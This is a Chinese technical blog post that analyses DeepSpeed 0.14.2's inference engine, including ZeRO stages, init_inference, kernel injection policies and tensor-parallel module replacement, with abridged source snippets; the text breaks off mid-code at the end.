    <content type="html"><![CDATA[<p>推理和训练大模型通常需要巨大的计算资源和时间。微软推出 <a href="https://github.com/microsoft/DeepSpeed">DeepSpeed</a> 深度学习优化库，旨在解决这一问题。从本篇博客中，我们将深入了解 deepspeed，并理解微软的工程师们是如何通过对内存、并行度、通信的优化，从而极大地加速了大模型的推理和训练过程。</p><p>注：本篇博文的源码分析基于 deepspeed-0.14.2。</p><h1>DeepSpeed 简介</h1><p>DeepSpeed 是一个专门为深度学习模型训练设计的优化库。它实现了 <a href="https://arxiv.org/abs/1910.02054">ZeRO 论文</a>中描述的所有内容。它是目前开源社区中广泛使用的训练大模型的框架。一般地，它支持以下三个阶段（stage）：</p><ul><li>ZeRO stage 1：优化器状态分区</li><li>ZeRO stage 2：梯度分区</li><li>ZeRO stage 3：参数分区</li></ul><p>上述三个阶段给了用户更多更灵活的训练选择。用户可参考<a href="https://huggingface.co/docs/transformers/main/deepspeed#select-a-zero-stage">官方文档</a>，选择适配自己硬件条件的训练方式。一般而言，花费的内存越少，训练时间越长；花费的内存越多，训练时间越短。</p><table><thead><tr><th>Fastest</th><th>Memory efficient</th></tr></thead><tbody><tr><td>ZeRO-1</td><td>ZeRO-3 + offload</td></tr><tr><td>ZeRO-2</td><td>ZeRO-3</td></tr><tr><td>ZeRO-2 + offload</td><td>ZeRO-2 + offload</td></tr><tr><td>ZeRO-3</td><td>ZeRO-2</td></tr><tr><td>ZeRO-3 + offload</td><td>ZeRO-1</td></tr></tbody></table><p>此外，它还支持了以下功能：</p><ul><li>自定义混合精度训练处理。使用类似 PyTorch AMP 的方式，也可以选择使用类似 Apex 的方式</li><li>基于 CUDA 扩展的快速优化器。主要优化器包括 Adam、AdamW、OneBitAdam 和 Lamb</li><li>将部分训练参数卸载到 CPU 主存或者 SSD 上，适合于显存空间不足的用户。详细可参考<a href="https://arxiv.org/abs/2101.06840">ZeRO-Offload</a> 到 CPU 和 <a href="https://arxiv.org/pdf/2104.07857.pdf">NVMe</a>这两篇论文。</li></ul><h1>deepspeed 之大模型推理</h1><p>网络上使用 deepspeed 做训练的博客汗牛充栋，但使用它做推理的博客就比较少，因此我先从推理开始探索 deepspeed 的内部机制。从<a href="https://www.microsoft.com/en-us/research/blog/deepspeed-accelerating-large-scale-model-inference-and-training-via-system-optimizations-and-compression/">官网博客上</a>可以了解到，deepspeed 推理有如下几个特点：</p><ol><li>deepspeed 将推理的多个算子融合为单一的算子 kernel，从而减少 kernel 间的启动开销和访问内存的延迟。与 JIT、XLA 或其他项目的算子融合相比，deepspeed 的算子融合力度更猛，它融合了element-wise、矩阵乘、转置、归约到一个 kernel。与未融合相比，以上几个部分的加速比可分别达到 1.5x, 2.9x, 3x, 1.2x</li></ol><p><img src="https://www.microsoft.com/en-us/research/uploads/prod/2021/05/Fig1_DeepSpeed5_Blog.jpg" alt=""></p><ol start="2"><li><p>为推理定制化的 GeMM 。小 batch size 会导致维度更瘦小 GeMM 运算操作：即参与 Gemm 运算的矩阵都是权重参数比激活大得多的矩阵，并且每个参数的总计算量受批量大小的限制。此时，GeMM 的性能主要取决于从主内存读取参数所花费的时间，即内存瓶颈，而不是 GPU 的计算瓶颈。因此，为了达到最佳性能，deepspeed 对推理内核进行了微调，以最大限度地利用内存带宽来加载参数。这项优化使得 DeepSpeed 推理内核在批量大小为 1-10 的推理工作负载上，实现比 NVIDIA cuBLAS 库高出 20% 的性能。</p></li><li><p>使用通用和专用的 Transformer 内核。deepspeed 推理部分使用了两种 transformers 内核来实现前文提到的两个优化方案：</p></li></ol><p>Generic Transformer：使用深度融合技术，将 Transformer 中的各个 PyTorch 操作（如 LayerNorm、Softmax 和 bias-add）替换为高度优化的 DeepSpeed 版本。<br>Specialized Transformer：进一步利用深度融合技术，创建了融合调度，不仅在PyTorch的宏操作符（如Softmax）内部融合微操作符，还在多个宏操作符（如 Softmax 和 LayerNorm，以及转置操作和甚至 GeMM）之间进行融合。Specialized Transformer 内核的融合结构上图所示。</p><p>但在深究这些高大上的优化原理和实现之前，我们需要先用 deepspeed 跑一个模型，以此作为一个驱动例子，带领我们一步步深入下去：</p><h2 id="使用-deepspeed-完成模型推理">使用 deepspeed 完成模型推理</h2><h3 id="具体步骤">具体步骤</h3><p>首先，需要进入 NGC docker，再安装 deepspeed transformers 等库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run --init -it --name <span class="hljs-variable">$&#123;NAME&#125;</span> nvcr.io/nvidia/pytorch:23.03-py3 /bin/bash<br>pip install deepspeed transformers sentencepiece mpi4py<br></code></pre></td></tr></table></figure><p>然后，准备好模型和权重数据。敲入以下推理代码，以模型 <code>t5-v1_1-small</code> 为例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># create the model</span><br><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> pipeline<br><span class="hljs-keyword">from</span> transformers.models.t5.modeling_t5 <span class="hljs-keyword">import</span> T5Block<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> deepspeed<br><br>local_rank = <span class="hljs-built_in">int</span>(os.environ[<span class="hljs-string">&quot;LOCAL_RANK&quot;</span>])<br>world_size = <span class="hljs-built_in">int</span>(os.environ[<span class="hljs-string">&quot;WORLD_SIZE&quot;</span>])<br>deepspeed.init_distributed()<br>pipe = pipeline(<span class="hljs-string">&quot;text2text-generation&quot;</span>, model=<span class="hljs-string">&quot;google/t5-v1_1-small&quot;</span>, device=local_rank)<br><span class="hljs-comment"># Initialize the DeepSpeed-Inference engine</span><br>pipe.model = deepspeed.init_inference(<br>    pipe.model,<br>    tensor_parallel=&#123;<span class="hljs-string">&quot;tp_size&quot;</span>: world_size&#125;,<br>    dtype=torch.<span class="hljs-built_in">float</span>,<br>    injection_policy=&#123;T5Block: (<span class="hljs-string">&#x27;SelfAttention.o&#x27;</span>, <span class="hljs-string">&#x27;EncDecAttention.o&#x27;</span>, <span class="hljs-string">&#x27;DenseReluDense.wo&#x27;</span>)&#125;<br>)<br>output = pipe(<span class="hljs-string">&#x27;Input String&#x27;</span>)<br></code></pre></td></tr></table></figure><p>然后就是启动 deepspeed 完成推理：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">deepspeed --num_gpus 2 inference.py<br></code></pre></td></tr></table></figure><h3 id="init-inference">init_inference</h3><p>简单地解释一下 <code>deepspeed.init_inference</code> 这个重要的 API。该 API 装入并初始化推理模型。第一个参数是传入的推理模型；<code>tensor_parallel</code> 传入推理时用的张量并行度参数，一般就是显卡的数量；第三个参数是运算类型；第四个 <code>injection_policy</code> 参数给那些不支持 deepspeed 内核的模型准备的，用户需要手动指定模型的“注入策略”，即 Transformer 层的两个特定线性层：1）attention output GeMM 和 2）layer output GeMM。deepspeed 内部会根据用户提供的层，增加必要的 all-reduce 通信以便将各个 GPU 上的计算结果合并起来。上面的 <code>t5-v1_1-small</code> 就是例子。当然不是所有的 transformers 库内的模型都可以这样做，<a href="https://www.deepspeed.ai/tutorials/automatic-tensor-parallelism/#supported-models">官方文档中列出了目前支持的模型</a></p><p>但具体到 <code>injection_policy</code> 是如何确定的，又是如何实现并行的，我们还要接着往下看。但机敏的读者可以猜到，多半是根据 <a href="https://github.com/huggingface/transformers/blob/v4.40.0/src/transformers/models/t5/modeling_t5.py#L646">t5 模型源码里的 <code>T5Block</code> 类</a>内的 layer(nn.Module) 确定，实现 <code>SelfAttention.o</code>, <code>EncDecAttention.o</code>, <code>DenseReluDense.wo</code> 的计算并行。</p><p>此外，还有一些比较重要的参数，但在这个例子中没有体现，比如 <code>replace_with_kernel_inject=True</code> 可以将模型内的部分 kernel 替换成 deepspeed 内开发的高性能 kernel。</p><p>有时还需要完成 DeepSpeed 配置文件（通常为<code>ds_config.json</code>），指定使用的推理优化策略、参数等资源等，详细的配置说明可参考<a href="https://www.deepspeed.ai/docs/config-json/">官方文档</a>。</p><h2 id="deepspeed-推理引擎">deepspeed 推理引擎</h2><p>简单尝试过使用 deepspeed 推理模型后，接下来我们就要分析底层原理，探究更深的奥秘。我们紧接上文，从 <code>init_inference</code> 这个 API 出发，发现其内部简化后也就是很简单的几句 python：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_inference</span>(<span class="hljs-params">model, config=<span class="hljs-literal">None</span>, **kwargs</span>):<br>  ds_inference_config = DeepSpeedInferenceConfig(**config_dict)<br>  engine = InferenceEngine(model, config=ds_inference_config)<br>  <span class="hljs-keyword">return</span> engine<br></code></pre></td></tr></table></figure><p><a href="https://deepspeed.readthedocs.io/en/latest/inference-init.html#deepspeed.inference.config.DeepSpeedInferenceConfig">DeepSpeedInferenceConfig</a> 就是配置 deepspeed 推理时的 config 数据。真正要启动的 <code>InferenceEngine</code> 是我们比较关心的。</p><h3 id="InferenceEngine-之-forward">InferenceEngine 之 forward</h3><p>找到 <code>InferenceEngine</code> 实现后，首先关注一下它的前推函数（有删减）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, *inputs, **kwargs</span>):<br>  <span class="hljs-string">&quot;&quot;&quot;Execute forward propagation</span><br><span class="hljs-string">  Arguments:</span><br><span class="hljs-string">    *inputs: Variable length input list</span><br><span class="hljs-string">    **kwargs: variable length keyword arguments</span><br><span class="hljs-string">  &quot;&quot;&quot;</span><br>  start = <span class="hljs-literal">None</span><br>  <span class="hljs-keyword">if</span> self.model_profile_enabled:<br>    <span class="hljs-comment"># 开始推理的计时</span><br>    get_accelerator().synchronize()<br>    start = time.time()<br><br>  <span class="hljs-keyword">if</span> self._config.enable_cuda_graph <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> self.local_cuda_graph:<br>    <span class="hljs-comment"># 如果可以的话 使用 cuda graph 推理</span><br>    <span class="hljs-keyword">if</span> self.cuda_graph_created:<br>      outputs = self._graph_replay(*inputs, **kwargs)<br>    <span class="hljs-keyword">else</span>:<br>      self._create_cuda_graph(*inputs, **kwargs)<br>      outputs = self._graph_replay(*inputs, **kwargs)<br>    <span class="hljs-comment"># 不行就直接推</span><br>  <span class="hljs-keyword">else</span>:<br>    outputs = self.module(*inputs, **kwargs)<br><br>  <span class="hljs-keyword">if</span> self.model_profile_enabled <span class="hljs-keyword">and</span> self._config.enable_cuda_graph:<br>    <span class="hljs-comment"># 结束计时</span><br>    get_accelerator().synchronize()<br>    duration = (time.time() - start) * <span class="hljs-number">1e3</span>  <span class="hljs-comment"># convert seconds to ms</span><br>    self._model_times.append(duration)<br><br>  <span class="hljs-keyword">return</span> outputs<br></code></pre></td></tr></table></figure><p>代码中提到的 <a href="https://developer.nvidia.com/blog/cuda-graphs/">cuda graph</a> 是 cuda10 中为了加速模型计算流程而提出的优化特性，简单地说，CUDA Graphs 将整个计算流程定义为一个图，通过提供一种由单个 CPU 操作来启动图上的多个 GPU kernel 的方式减少 kernel 的启动开销。</p><p>另外从代码中看到的比较有用的东西，在这里插一句：transformers 中定义的模型基本都有 <code>register_forward_pre_hook</code> 和 <code>register_forward_hook</code> 这两个 hook 函数，可以很方便地让程序员在前推模型之前和之后插入自己的函数，方便调试或计时。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">profile_model_time</span>(<span class="hljs-params">self, use_cuda_events=<span class="hljs-literal">True</span></span>):<br>  <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.model_profile_enabled <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> self._config.enable_cuda_graph:<br>    self.module.register_forward_pre_hook(self._pre_forward_hook)<br>    self.module.register_forward_hook(self._post_forward_hook)<br></code></pre></td></tr></table></figure><h3 id="tensor-parallelism-与-injection-policy">tensor_parallelism 与 injection_policy</h3><h4 id="三种模式">三种模式</h4><p>看了上小节的推理代码，你可能会想，这和一般的推理过程也没区别啊。别急，deepspeed 的优雅之处就是在于，它可以近似无伤地优化模型，但模型内部已经被 deepspeed 改动过了。就如同我们上文的 <code>t5-v1_1-small</code> 模型，它的很多 layer 层已经被注入高性能的 deepspeed kernel。</p><p>总的来讲，deepspeed 推理引擎支持三种模式：</p><ul><li>用户指定的张量并行策略   user specified policy for tensor-parallelism.</li><li>高性能 kernel 注入      kernel injection (replace_with_kernel_inject)</li><li>自动化张量并行          automatic tensor parallelism if tp_size &gt; 1.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 1. User specified Tensor Parallelism</span><br><span class="hljs-keyword">for</span> client_module, injection_policy <span class="hljs-keyword">in</span> self.injection_dict.items():<br>  <span class="hljs-comment"># 1.1 construct the tuple and pass that instead of a string or dict.</span><br>  config.injection_policy_tuple = injection_policy<br>  self._apply_injection_policy(config, client_module)<br><span class="hljs-comment"># 2. DeepSpeed Kernel Injection</span><br><span class="hljs-keyword">if</span> config.replace_with_kernel_inject:<br>  self._apply_injection_policy(config)<br><span class="hljs-comment"># 3. Automatic Tensor Parallelism</span><br><span class="hljs-keyword">elif</span> config.tensor_parallel.tp_size &gt; <span class="hljs-number">1</span>:<br>  <span class="hljs-comment"># tp_parser model</span><br>  parser_dict = AutoTP.tp_parser(model)<br>  <span class="hljs-keyword">for</span> client_module, injection_policy <span class="hljs-keyword">in</span> parser_dict:<br>      config.injection_policy_tuple = injection_policy<br>    self._apply_injection_policy(config, client_module)<br></code></pre></td></tr></table></figure><p>明显看得出来，<code>_apply_injection_policy</code> 函数在支持张量并行时起到了关键作用。<strong>三种模式都离不开该函数的支持</strong>。它获取了 <code>injection_dict</code> 中的数据，以前文 <code>t5-v1_1-small</code> 模型为例，<code>injection_dict</code> 就是 <code>T5Block: ('SelfAttention.o', 'EncDecAttention.o', 'DenseReluDense.wo')</code>。再次回顾一下，<code>injection_dict</code> 中输入的线性层要求是两个特定线性层中的一种：1）attention output GeMM 和 2）layer output GeMM。</p><p>我在运行 <code>t5-v1_1-small</code> 模型时将它的 layer 信息打印了出来，我们可以看看到底是哪些 kernel 会被 inject：</p><p><img src="/img/LLM/T5_inject_policy.png" alt="T5 网络架构的部分截图"></p><p>从打印信息看到，encoder/decoder 的 attention 层计算，以及 DenseFFN 网络会被完成注入替换。</p><p>接下来的重头戏就是，我们要搞清楚它是如何完成注入替换的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_apply_injection_policy</span>(<span class="hljs-params">self, config, client_module=<span class="hljs-literal">None</span></span>):<br>  <span class="hljs-comment"># client_module is only passed when using the injection_dict method.</span><br>  checkpoint_dir = config.checkpoint<br>  checkpoint = SDLoaderFactory.get_sd_loader_json(checkpoint_dir,<br>                                                  self.checkpoint_engine) <span class="hljs-keyword">if</span> checkpoint_dir <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>  generic_injection(self.module, dtype=config.dtype, enable_cuda_graph=config.enable_cuda_graph)<br><br>  <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(self.module, torch.nn.Module):<br>    <span class="hljs-comment"># config is our DeepSpeedInferenceConfig and self.config is the HF model config</span><br>    replace_transformer_layer(client_module, self.module, checkpoint, config, self.config)<br></code></pre></td></tr></table></figure><p>从上面代码可以了解到，该函数将 kernel inject 任务划分为两部分：</p><ul><li><code>replace_transformer_layer</code> 完成 <code>nn.Module</code> 类的替换</li><li><code>generic_injection</code> 完成非 <code>nn.Module</code> 类的替换</li></ul><h4 id="replace-transformer-layer">replace_transformer_layer</h4><p>多数情况下大家的模型代码继承自 <code>nn.Module</code>，因此我们先来看看 <a href="https://github.com/microsoft/DeepSpeed/blob/v0.14.2/deepspeed/module_inject/replace_module.py#L182-L497"><code>replace_transformer_layer</code> 的源码</a>，看它是怎么处理 <code>nn.Module</code> 类的替换。</p><p>先回顾一下前文，避免被弄晕。在运行模型推理时，我们需要通过 <code>init_inference</code> API 中的 <code>injection_policy</code> 参数将模型内的某些 layer 层替换为 deepspeed 提供的高性能层。而用户传入的类名就是 <code>_apply_injection_policy(config, client_module)</code> 中的 <code>client_module</code>，也即是 <code>replace_transformer_layer</code> 的 <code>orig_layer_impl</code>。用 <code>t5-v1_1-small</code> 为例，<code>orig_layer_impl</code> 就是 <code>T5Block</code>，其中的 <code>injection_policy</code> 则是 ‘SelfAttention.o’, ‘EncDecAttention.o’, ‘DenseReluDense.wo’ 。而 <code>model</code> 是用户传入的整个模型。</p><p><img src="/img/LLM/replace_transformer_layer.png" alt=""></p><p>上面列出的函数调用栈（从上往下）可以看到，用户传入的 <code>injection_policy</code> 字典中，其键表示要执行 inject 的类，而其值对应了如何对该类进行优化的策略 <code>policy</code>：它在用户提供的 layer 层和 deepspeed 内有的高度优化的推理 transformer 层之间搭建起了一个映射。deepspeed 官方提供了不少基于 transformer 的高度优化过的推理层，如果用户提供的 layer 层恰好与这些相匹配，那么可以直接借鉴官方内部的优化策略。</p><p>下面来看一下这部分的源码（有删减）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">replace_transformer_layer</span>(<span class="hljs-params">orig_layer_impl, model, checkpoint_dict, config, model_config</span>):<br>  <span class="hljs-comment"># ...</span><br>  mp_replace = ReplaceWithTensorSlicing(mp_group=config.tensor_parallel.tp_group,<br>                                        mp_size=config.tensor_parallel.tp_size)<br>  <span class="hljs-keyword">if</span> checkpoint_dict <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> config.replace_with_kernel_inject:<br>    <span class="hljs-comment"># AutoTP shard loading</span><br>    checkpoint = checkpoint_dict[<span class="hljs-string">&quot;checkpoints&quot;</span>]<br>    pbar = tqdm.tqdm(total=<span class="hljs-built_in">len</span>(checkpoint), desc=<span class="hljs-string">f&quot;Loading <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(checkpoint)&#125;</span> checkpoint shards&quot;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(checkpoint)):<br>      checkpoint_file = os.path.join(config.base_dir, checkpoint[i])<br>      replaced_module = replace_module(model=model,<br>                                        orig_class=orig_layer_impl,<br>                                        replace_fn=replace_fn,<br>                                        _replace_policy=config.injection_policy_tuple,<br>                                        checkpoint=checkpoint_file)<br>    replaced_module = set_lm_head(replaced_module)<br>  <span class="hljs-keyword">else</span>:<br>    replaced_module = replace_module(model=model,<br>                                    orig_class=orig_layer_impl,<br>                                    replace_fn=replace_fn,<br>                                    _replace_policy=config.injection_policy_tuple)<br>  <span class="hljs-comment"># ...</span><br></code></pre></td></tr></table></figure><p>上面的源码中，最重要的就是这个函数：<code>replace_module</code>。它负责扫描整个模型，找到所有是 <code>orig_layer_impl</code> 类的实例，然后调用 <code>replace_fn</code> 函数将它们替换掉，<code>_replace_policy</code> 则是针对该 layer 层的优化策略。</p><p>这些源码篇幅较长，不适合全部粘贴放在此处，建议读者将本博客与 <a href="https://github.com/microsoft/DeepSpeed/blob/master/deepspeed/module_inject/replace_module.py#L573-L608">deepspeed replace_module的源码</a>一起服用，效果更佳。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">replace_module</span>(<span class="hljs-params">model, orig_class, replace_fn, _replace_policy, checkpoint=<span class="hljs-literal">None</span></span>):<br>  <span class="hljs-string">&quot;&quot;&quot; Scan the model for instances of ``orig_clas:`` to replace using ``replace_fn``.</span><br><span class="hljs-string">  Arguments:</span><br><span class="hljs-string">      model (torch.nn.Module): the model to augment</span><br><span class="hljs-string">      orig_class (torch.nn.Module): the module to search for</span><br><span class="hljs-string">      replace_fn (method): a method to convert instances of ``orig_class`` to the</span><br><span class="hljs-string">                            desired type and return a new instance.</span><br><span class="hljs-string">  Returns:</span><br><span class="hljs-string">      A modified ``model``.</span><br><span class="hljs-string">  &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># ... #</span><br>    policy = &#123;&#125;<br>    <span class="hljs-keyword">if</span> orig_class <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        policy.update(&#123;orig_class: (replace_fn, _replace_policy)&#125;)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> plcy <span class="hljs-keyword">in</span> replace_policies:<br>            <span class="hljs-comment"># instantiate a throw-away policy in order to populate the _orig_layer_class</span><br>            _ = plcy(<span class="hljs-literal">None</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(plcy._orig_layer_class, <span class="hljs-built_in">list</span>):<br>                <span class="hljs-keyword">for</span> orig_layer_class <span class="hljs-keyword">in</span> plcy._orig_layer_class:<br>                    policy.update(&#123;orig_layer_class: (replace_fn, plcy)&#125;)<br>            <span class="hljs-keyword">elif</span> plcy._orig_layer_class <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                policy.update(&#123;plcy._orig_layer_class: (replace_fn, plcy)&#125;)<br>    replaced_module, _ = _replace_module(model, policy, state_dict=sd)<br>    <span class="hljs-keyword">return</span> replaced_module<br></code></pre></td></tr></table></figure><p>总的来说，<code>replace_module</code> 函数的流程是这样的：</p><ol><li>根据输入的 <code>orig_class</code> 类名（本例中的 <code>T5Block</code>），寻找 deepspeed 中支持的 policy，如果有 deepspeed 能支持的 policy 分割法，那么直接就使用，否则保留。</li><li>进入 <code>_replace_module</code> 函数，开始递归处理模型。它会遍历 <code>model</code> 中所有的 layer，并找到 policy 中 layer 层</li><li>对于每个找到的 layer，调用 <code>replace_fn</code> 函数做替换</li><li>对于不在 policy 中的 layer 层，使用自动化张量并行(AutoTP)的方式处理，并递归调用 <code>_replace_module</code>，处理其子层。</li><li>若没有输入 <code>orig_class</code> 类名，那么 <code>replace_module</code> 函数会将所有 deepspeed 内支持的 policy 都存放到字典中，并在递归函数中逐个去比对，比对成功后替换。</li></ol><p>那么 <code>replace_fn</code> 函数如何将原来的 layer 层做替换的呢？对于“高性能 kernel 注入”的模式，使用 <code>replace_with_policy</code>；对于“用户指定的张量并行策略”模式，使用 <code>replace_wo_policy</code> 处理：</p><h4 id="replace-wo-policy">replace_wo_policy</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">replace_fn</span>(<span class="hljs-params">child, _policy, layer_id=<span class="hljs-number">0</span>, prefix=<span class="hljs-string">&quot;&quot;</span>, state_dict=<span class="hljs-literal">None</span></span>):<br>  training = <span class="hljs-literal">False</span>  <span class="hljs-comment"># todo: refactor this part to go in the config</span><br>  <span class="hljs-keyword">if</span> training:<br>    <span class="hljs-comment"># copy relevant state from child -&gt; new module</span><br>    new_module = replace_with_policy(child, _policy, config.triangular_masking)<br>  <span class="hljs-keyword">else</span>:<br>    <span class="hljs-comment"># copy relevant state from child -&gt; new module</span><br>    <span class="hljs-keyword">if</span> config.replace_with_kernel_inject:<br>        new_module = replace_with_policy(child,<br>                                          _policy,<br>                                          config.triangular_masking,<br>                                          inference=<span class="hljs-literal">True</span>,<br>                                          layer_id=layer_id)<br>    <span class="hljs-keyword">else</span>:<br>        new_module = replace_wo_policy(child, _policy, prefix=prefix, state_dict=state_dict)<br>  <span class="hljs-keyword">return</span> new_module<br></code></pre></td></tr></table></figure><p>我们来看一下 <code>replace_wo_policy</code> 如何实现的，以及它是如何处理我们上面给出的例子的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">replace_wo_policy</span>(<span class="hljs-params">module, all_reduce_linears, prefix=<span class="hljs-string">&quot;&quot;</span>, state_dict=<span class="hljs-literal">None</span></span>):<br>  <span class="hljs-comment"># 1. 创建 AutoTP 类</span><br>  _autotp = AutoTP(module, all_reduce_linears, prefix, state_dict, linear_layer_setting, orig_layer_impl)<br>  <span class="hljs-comment"># 2. 配置 tensor parallelism config</span><br>  _autotp.set_tensor_parallel_config(config.tensor_parallel.tp_size, config.tensor_parallel.tp_group)<br>  <span class="hljs-comment"># 3. 获得 num_key_heads from model_config.num_key_value_heads</span><br>  num_kv_heads = _autotp.get_model_num_kv_heads(model_config)<br>  <span class="hljs-comment"># 4. When we have num_kv_heads defined, uneven division is possible, otherwise enforce even division</span><br>  set_num_kv_heads(num_kv_heads)<br>  <span class="hljs-comment"># 4.1 Get n_embd</span><br>  n_embd = <span class="hljs-literal">None</span><br>  multi_query_n_embd_names = [<span class="hljs-string">&#x27;n_embd&#x27;</span>]<br>  <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> multi_query_n_embd_names:<br>      <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(model_config, name):<br>          n_embd = <span class="hljs-built_in">getattr</span>(model_config, name)<br>      <span class="hljs-keyword">if</span> n_embd != <span class="hljs-literal">None</span>:<br>          <span class="hljs-keyword">break</span><br>  <span class="hljs-comment"># 4.2 set n_embd</span><br>  set_n_embd(n_embd)<br>  <span class="hljs-comment"># 5. Set linear policies</span><br>  _autotp.update_linear_policies()<br>  <span class="hljs-comment"># 6. Replace modules</span><br>  <span class="hljs-keyword">if</span> <span 